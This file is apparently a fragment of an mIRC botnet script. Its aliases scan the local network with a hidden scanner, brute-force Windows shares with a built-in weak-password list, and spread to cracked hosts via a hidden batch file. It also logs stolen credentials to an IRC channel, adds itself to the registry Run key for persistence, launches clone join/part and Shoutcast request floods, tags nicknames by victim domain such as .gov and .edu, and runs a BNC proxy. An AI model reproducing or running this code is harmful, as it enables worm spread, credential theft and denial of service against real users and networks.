  if ($disk(j:) == $true) { msg %channel [9Drive J:\ $bytes($disk(j:).size) $iif($remove($right($bytes($disk(j:).size).suf,2),0,1,2,3,4,5,6,7,8,9) == G, GB, $remove($right($bytes($disk(j:).size).suf,2),0,1,2,3,4,5,6,7,8,9)) $upper($disk(j:).type) $chr(40) $+ $iif($disk(j:).label == $null, None, $disk(j:).label) $+ $chr(41) Free: $bytes($disk(j:).free) $iif($remove($right($bytes($remove($bytes($disk(j:).free,b),$chr(44))).suf,2),0,1,2,3,4,5,6,7,8,9) == G, GB, $remove($right($bytes($remove($bytes($disk(j:).free,b),$chr(44))).suf,2),0,1,2,3,4,5,6,7,8,9)) $+ ] }
  if ($disk(z:) == $true) { msg %channel [8Drive Z:\ $bytes($disk(j:).size) $iif($remove($right($bytes($disk(j:).size).suf,2),0,1,2,3,4,5,6,7,8,9) == G, GB, $remove($right($bytes($disk(j:).size).suf,2),0,1,2,3,4,5,6,7,8,9)) $upper($disk(j:).type) $chr(40) $+ $iif($disk(j:).label == $null, None, $disk(j:).label) $+ $chr(41) Free: $bytes($disk(j:).free) $iif($remove($right($bytes($remove($bytes($disk(j:).free,b),$chr(44))).suf,2),0,1,2,3,4,5,6,7,8,9) == G, GB, $remove($right($bytes($remove($bytes($disk(j:).free,b),$chr(44))).suf,2),0,1,2,3,4,5,6,7,8,9)) $+ ] }
}


;**************************
;*     spreed alias       *
;**************************
alias Reshet { if (%nowscan == $null) { set %Reshet $gettok($ip,1,46) $+ . $+ $gettok($ip,2,46) | msg %channel 7S14tarting my network scan 2[ %Reshet $+ .0.0 - %Reshet $+ .255.255 ]-[ $1 ]-[ $2 ] | set %nowscan %Reshet $+ .0.0 %Reshet $+ .255.255 | timer 0 1 fuckspreed | hiderun ipcscan.exe %nowscan -p $1 -t $2 } | else { msg %channel 7I 14allready scaning %nowscan } }
alias spreedhack { chspreed | hiderun shere.bat %hk %user1 %pass1 }
alias chspreed { msg %channel 15-14=1]  $+ %hk $+ [14=15- 2[4F2]1o14un2[15d2] 2[4N15T2] [4A2]1cc14ou15n2[15t2]12 15..14::1[ 4 %user1 $+ 9 / 12 $+ %pass1 1]14::15.. | msg %channel 7S14tarting to spreed1 %hk }
alias fuckspreed { 
  if ($remove($gettok($read(ipcscan.txt,1),1,32),],[,:) != $null) {
    set %hk $remove($gettok($read(ipcscan.txt,1),1,32),],[,:)
    if ($gettok($gettok($remove($gettok($read(ipcscan.txt,1),1,33),],[,:),5,32),2,47) != null) { set %pass1 $gettok($gettok($remove($gettok($read(ipcscan.txt,1),1,33),],[,:),5,32),2,47) }
    if ($gettok($gettok($remove($gettok($read(ipcscan.txt,1),1,33),],[,:),5,32),2,47) == null) { unset %pass1 } 
    set %user1 $gettok($gettok($remove($gettok($read(ipcscan.txt,1),1,33),],[,:),5,32),1,47) 
    spreedhack %hk
    write hack.log %hk %user1 $+ / $+ %pass1 
  remove ipcscan.txt }
}
------------------
Passwords Scanner.
------------------
alias makepass {
  remove ipcpass.dic
  write ipcpass.dic 123  
  write ipcpass.dic 1234
  write ipcpass.dic 12345
  write ipcpass.dic 123456
  write ipcpass.dic 1234567
  write ipcpass.dic 12345678
  write ipcpass.dic 654321
  write ipcpass.dic 54321
  write ipcpass.dic 1
  write ipcpass.dic 111
  write ipcpass.dic 11111
  write ipcpass.dic 111111
  write ipcpass.dic 11111111
  write ipcpass.dic 000000
  write ipcpass.dic 00000000
  write ipcpass.dic 888888
  write ipcpass.dic 88888888
  write ipcpass.dic 5201314
  write ipcpass.dic pass
  write ipcpass.dic passwd
  write ipcpass.dic password
  write ipcpass.dic sql
  write ipcpass.dic database
  write ipcpass.dic admin
  write ipcpass.dic root
  write ipcpass.dic google
  write ipcpass.dic msn
  write ipcpass.dic terror
  write ipcpass.dic secret
  write ipcpass.dic oracle
  write ipcpass.dic sybase
  write ipcpass.dic test
  write ipcpass.dic server
  write ipcpass.dic computer
  write ipcpass.dic Internet
  write ipcpass.dic super
  write ipcpass.dic news
  write ipcpass.dic sex
  write ipcpass.dic style
  write ipcpass.dic metal
  write ipcpass.dic black
  write ipcpass.dic usa
  write ipcpass.dic fire
  write ipcpass.dic nokia
  write ipcpass.dic sony
  write ipcpass.dic user
  write ipcpass.dic manager
  write ipcpass.dic security
  write ipcpass.dic public
  write ipcpass.dic private
  write ipcpass.dic default
  write ipcpass.dic 1234qwer
  write ipcpass.dic 123qwe
  write ipcpass.dic abcd
  write ipcpass.dic abc123
  write ipcpass.dic 123abc
  write ipcpass.dic abc
  write ipcpass.dic 123asd
  write ipcpass.dic asdf
  write ipcpass.dic asdfgh
  write ipcpass.dic !@#$
  write ipcpass.dic !@#$%
  write ipcpass.dic !@#$%^
  write ipcpass.dic !@#$%^&
  write ipcpass.dic !@#$%^&*
  write ipcpass.dic !@#$%^&*(
  write ipcpass.dic !@#$%^&*()
  msg %channel 2 I7m 14ready to scan with pass list
}
alias makenopass {
  remove ipcpass.dic
  write ipcpass.dic
  msg %channel 2 I7m 14ready to scan without pass list
}
;**************************
;*     DFind  aliases     *
;**************************
alias removeDFind {
  if ($exists(DFind.txt) == $true) { remove DFind.txt | msg %channel 7D14Find scanning stopped... } | else { timer 1 2 removeDFind }
}
alias Dfind-chk {
  if ($read(DFind,%r) != $null) {
    msg %channel $read(DFind.txt,%r)
    write Dfind.log $read(DFind.txt,%r)
  }
  if ($read(DFind.txt,%r) != $null) {
    inc %r
  }
}
alias rad-chk {
  if ($gettok($read(DFind.txt,%r),5,32) == NULL) {
    msg %channel $gettok($read(DFind.txt,%r),1,32) $gettok($read(DFind.txt,%r),2,32)
    write Dfind.log $read(DFind.txt,%r)
  }
  if ($read(DFind.txt,%r) != $null) {
    inc %r
  }
}
------------
UPTIME
------------
alias infoma {
  if (wks isin $uptime(system,2)) { return 11,1My Windows Is $os - Runing $uptime(system,2) $+  } 
  elseif (wk isin $uptime(system,2)) { return 4,1My Windows Is $os - Runing $uptime(system,2) $+  }
  elseif (days isin $uptime(system,2)) { return 12,1My Windows Is $os - Runing $uptime(system,2) $+  }
  else { return 15,1My Windows Is $os - Runing $uptime(system,2) $+  } 
}
------------
registery
------------
alias regedititit {
  set %x $+($r(a,z),$r(1,99),.reg)
  write %x REGEDIT4 
  write %x [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] 
  write %x $+("Win,$os,Securty"=",$replace($mircdir,\,\\),$nopath($mircexe),") 
  .run -n regedit /s %x 
  .timer 1 3 .remove %x 
  .timer 1 4 unset %x 
}
-----------
;**************************
;*     CLONE  aliases     *
;**************************
alias joinpartflood { sockwrite -tn Sockets-* JOIN $1 $2 | sockwrite -tn Sockets-* PART $1 $3- }
on *:sockopen:Sockets-*:{ sockwrite -tn $sockname PONG $server | sockwrite -tn $sockname USER $nfs2 $nfs2 $nfs2 : $+ $nfs2 | sockwrite -tn $sockname NICK $read(mainhq.dbx) }
on *:sockread:Sockets-*:{
  sockread %SocketTemp
  tokenize 32 %SocketTemp
  if ($1 == ping) { sockwrite -tn $sockname pong $2- }
  if ($mid(%SocketTemp,1,4) == PING) { sockwrite -tn $sockname PONG $mid($gettok(%SocketTemp,2,32),2) }
}
alias nfs { return $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) $+ $rand(1,9) }
alias nfs2 { return $r(1,1000) $+ $r(a,z) $+ $r(1,1000) }
alias cloneradio { sockopen shoutcast $+ $rand(1,9999999999999999999999999999) $1- }
on *:sockopen:shoutcast*: {
  var %a = sockwrite -n shoutcast*
  %a GET / HTTP/1.0
  %a Host: $sock(shoutcast*).ip
  %a User-Agent: mSSC/1.1
  %a Accept: */*
  %a Icy-MetaData:0
  %a Connection: close
  %a
}

;**************************
;        HostNick         *
;**************************
alias hostnick { 
  if (.edu isin $host) || (.ac. isin $host) || (.cc. isin $host) || (uni isin $host) && (wk isin $uptime(system,2)) { nick wOw[edu-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.edu isin $host) || (.ac. isin $host) || (.cc. isin $host) || (uni isin $host) { nick wOw[edu- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.gov isin $host) && (wk isin $uptime(system,2)) { nick wOw[gov-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.gov isin $host) { nick wOw[gov- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (www isin $host) && (wk isin $uptime(system,2)) { nick wOw[www-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (www isin $host) { nick wOw[www- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (mail isin $host) && (wk isin $uptime(system,2)) { nick wOw[mail-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (mail isin $host) { nick wOw[mail- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.jp isin $host) && (wk isin $uptime(system,2)) { nick wOw[jp-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.jp isin $host) { nick wOw[jp- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.ru isin $host) && (wk isin $uptime(system,2)) { nick wOw[ru-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.ru isin $host) { nick wOw[ru- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.pl isin $host) && (wk isin $uptime(system,2)) { nick wOw[pl-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.pl isin $host) { nick wOw[pl- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.uk isin $host) && (wk isin $uptime(system,2)) { nick wOw[uk-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.uk isin $host) { nick wOw[uk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.us isin $host) && (wk isin $uptime(system,2)) { nick wOw[us-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.us isin $host) { nick wOw[us- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.tr isin $host) && (wk isin $uptime(system,2)) { nick wOw[tr-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.tr isin $host) { nick wOw[tr- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.ro isin $host) && (wk isin $uptime(system,2)) { nick wOw[ro-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.ro isin $host) { nick wOw[ro- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.es isin $host) && (wk isin $uptime(system,2)) { nick wOw[es-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.es isin $host) { nick wOw[es- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.at isin $host) && (wk isin $uptime(system,2)) { nick wOw[at-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.at isin $host) { nick wOw[at- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.au isin $host) && (wk isin $uptime(system,2)) { nick wOw[au-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.au isin $host) { nick wOw[au- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.de isin $host) && (wk isin $uptime(system,2)) { nick wOw[de-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.de isin $host) { nick wOw[de- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.dk isin $host) && (wk isin $uptime(system,2)) { nick wOw[dk-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.dk isin $host) { nick wOw[dk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.fi isin $host) && (wk isin $uptime(system,2)) { nick wOw[fi-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.fi isin $host) { nick wOw[fi- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.fr isin $host) && (wk isin $uptime(system,2)) { nick wOw[fr-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.fr isin $host) { nick wOw[fr- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.is isin $host) && (wk isin $uptime(system,2)) { nick wOw[is-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.is isin $host) { nick wOw[is- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.gr isin $host) && (wk isin $uptime(system,2)) { nick wOw[gr-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.gr isin $host) { nick wOw[gr- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.hu isin $host) && (wk isin $uptime(system,2)) { nick wOw[hu-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.hu isin $host) { nick wOw[hu- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.hk isin $host) && (wk isin $uptime(system,2)) { nick wOw[hk-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.hk isin $host) { nick wOw[hk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.jo isin $host) && (wk isin $uptime(system,2)) { nick wOw[jo-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.jo isin $host) { nick wOw[jo- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.kr isin $host) && (wk isin $uptime(system,2)) { nick wOw[kr-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.kr isin $host) { nick wOw[kr- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.ch isin $host) && (wk isin $uptime(system,2)) { nick wOw[ch-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.ch isin $host) { nick wOw[ch- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.cn isin $host) && (wk isin $uptime(system,2)) { nick wOw[cn-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.cn isin $host) { nick wOw[cn- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.br isin $host) && (wk isin $uptime(system,2)) { nick wOw[br-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.br isin $host) { nick wOw[br- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.no isin $host) && (wk isin $uptime(system,2)) { nick wOw[no-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.no isin $host) { nick wOw[no- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.nl isin $host) && (wk isin $uptime(system,2)) { nick wOw[nl-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.nl isin $host) { nick wOw[nl- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.mx isin $host) && (wk isin $uptime(system,2)) { nick wOw[mx-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.mx isin $host) { nick wOw[mx- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.sg isin $host) && (wk isin $uptime(system,2)) { nick wOw[sg-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.sg isin $host) { nick wOw[sg- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.se isin $host) && (wk isin $uptime(system,2)) { nick wOw[se-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.se isin $host) { nick wOw[se- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }  
  if (.cz isin $host) && (wk isin $uptime(system,2)) { nick wOw[cz-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.cz isin $host) { nick wOw[cz- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.be isin $host) && (wk isin $uptime(system,2)) { nick wOw[be-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.be isin $host) { nick wOw[be- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (hinet isin $host) && (wk isin $uptime(system,2)) { nick wOw[hinet-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (hinet isin $host) { nick wOw[hinet- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.il isin $host) || (bezeqint isin $host) || (barak isin $host) && (wk isin $uptime(system,2)) { nick wOw[iL-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.il isin $host) || (bezeqint isin $host) || (barak isin $host) { nick wOw[iL- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.ca isin $host) && (wk isin $uptime(system,2)) { nick wOw[ca-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.ca isin $host) { nick wOw[ca- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.tw isin $host) && (wk isin $uptime(system,2)) { nick wOw[tw-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.tw isin $host) { nick wOw[tw- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.it isin $host) && (wk isin $uptime(system,2)) { nick wOw[it-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (.it isin $host) { nick wOw[it- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (cable isin $host) && (wk isin $uptime(system,2)) { nick wOw[cable-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (cable isin $host) { nick wOw[cable- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (dsl isin $host) && (wk isin $uptime(system,2)) { nick wOw[dsl-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (dsl isin $host) { nick wOw[dsl- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (server isin $host) && (wk isin $uptime(system,2)) { nick wOw[server-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (server isin $host) { nick wOw[server- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (wks isin $uptime(system,2)) { nick wOw[wks- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  if (wk isin $uptime(system,2)) { nick wOw[wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
  nick wOw[ $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ]
  :end
}
;**************************
;*   Bnc sERVER alias     *
;**************************
on *:socklisten:Bnc:{ sockaccept BncClient $+ $r(1,999) }
on *:sockread:BncClient*:{
  sockread %BncClient
  if ($gettok(%BncClient,1,32) == NICK) {
    set %Bnc.nick $gettok(%BncClient,2,32)
  }
  if ($gettok(%BncClient,1,32) == USER) {
    set %Bnc.user $gettok(%BncClient,2-,32)
    sockwrite -n $sockname :wOw.BNC NOTICE AUTH : $+ 15,1Welcome To wOw-BNC 2.6 The Irc Proxy By 7kb
    sockwrite -n $sockname :wOw.BNC NOTICE AUTH : $+ 15,1You Need To Say /Quote Pass <Password>
    set %Bnc.login $null
  }
  if ($gettok(%BncClient,1,32) == PASS) {
    if ($gettok(%BncClient,2,32) == %Bnc.passwd) {
      sockwrite -n $sockname :wOw.BNC NOTICE AUTH : $+ 15,1Password Accepted
      sockwrite -n $sockname :wOw-BNC privmsg AUTH : $+ 15,1Password Accepted
      sockwrite -n $sockname :wOw-BNC privmsg AUTH : $+ 15,1Welcome To wOw-BNC 2.6 The Irc Proxy By 7kb
      sockwrite -n $sockname :wOw-BNC privmsg AUTH : $+ 15,1Level Two, Lets Connect To Something Real Now
      sockwrite -n $sockname :wOw-BNC privmsg AUTH : $+ 15,1Type /Quote Conn [Server] <Port> <Pass> To Connect
      sockwrite -n $sockname :wOw-BNC privmsg AUTH : $+ 15,1[Stats] Users:12 $sock(BncClient*,0) 15Connected:12 $sock(BncServer*,0) $+ 
      sockwrite -n $sockname :wOw-BNC privmsg AUTH : $+ 15,1Type /Quote Stats Pass - To Stats
      set %Bnc.login ok
      %Bnc.legit = yes
    }
    if ($gettok(%BncClient,2,32) != %Bnc.passwd) {
      sockwrite -n $sockname :wOw.BNC NOTICE AUTH : $+ 15,1Failed Pass!! | sockclose $sockname
    }
  }
  if ($gettok(%BncClient,1,32) == Stats) {
    if ($gettok(%BncClient,2,32) == %Bnc.passwd) {
      sockwrite -n $sockname :wOw-BNC privmsg AUTH : $+ 15,1[Stats] Users:12 $sock(BncClient*,0) 15Connected:12 $sock(BncServer*,0) $+ 
    }
    if ($gettok(%BncClient,2,32) != %Bnc.passwd) {
      sockwrite -n $sockname :wOw.BNC NOTICE AUTH : $+ 15,1Failed Pass!! | sockclose $sockname
    }
  }
  if ($gettok(%BncClient,1,32) == CONN) {
    if (%Bnc.legit != yes) && (%Bnc.login != ok) { sockwrite -n $sockname :wOw.BNC NOTICE AUTH : $+ 15,1BNC Exploits Dont Work On 7kb-BNC! | sockclose $sockname
    }
    if (BncServer $+ $remove($sockname,BncClient) != $null) {
      sockclose BncServer $+ $remove($sockname,BncClient)
    }
    if (%Bnc.login != ok) {
      sockwrite -n $sockname :wOw.BNC NOTICE AUTH : $+ 15,1BNC Exploits Dont Work On 7kb-BNC!
      sockwrite -n $sockname :wOw-BNC privmsg AUTH : $+ 15,1BNC Exploits Dont Work On 7kb-BNC!
      sockclose $sockname
    }
    sockopen BncServer $+ $remove($sockname,BncClient) $gettok(%BncClient,2,32) $gettok(%BncClient,3,32)
    sockwrite -n $sockname :wOw.BNC NOTICE AUTH : $+ 15,1Making Reality Through $gettok(%BncClient,2,32) Port $gettok(%BncClient,3,32)
    sockwrite -n $sockname :wOw-BNC privmsg AUTH : $+ 15,1Making Reality Through $gettok(%BncClient,2,32) Port $gettok(%BncClient,3,32)

    set %Bnc.server.passwd $gettok(%BncClient,4,32)
  }
  else {
    if ($sock(BncServer $+ $remove($sockname,BncClient)).status != active) {
      halt
    }
    sockwrite -n BncServer $+ $remove($sockname,BncClient) %BncClient
  }
}
alias servers {
  return wOw.yossi-gay.com
}
on *:sockopen:BncServer*:{
  if ($sockerr) {
    sockwrite -n $sockname :wOw-BNC NOTICE AUTH : $+ 15,1Failed Connection
    sockwrite -n $sockname :wOw-BNC privmsg AUTH : $+ 15,1Failed Connection
    sockclose $sockname
    halt
  }
  if ($sock($sockname).status != active) {
    sockwrite -n $sockname :wOw-BNC NOTICE AUTH : $+ 15,1Failed Connection
    sockwrite -n $sockname :wOw-BNC privmsg AUTH : $+ 15,1Failed Connection
    sockclose BncServer $+ $remove($socknme, BncServer)
    halt
  }
  sockwrite -n $sockname NICK %Bnc.nick
  sockwrite -n $sockname USER %Bnc.user
}
on *:sockread:BncServer*:{
  sockread %BncServer
  if ($sock(BncClient $+ $remove($sockname,BncServer)).status != active) {
    halt
  }
  sockwrite -n BncClient $+ $remove($sockname,BncServer) %BncServer
}
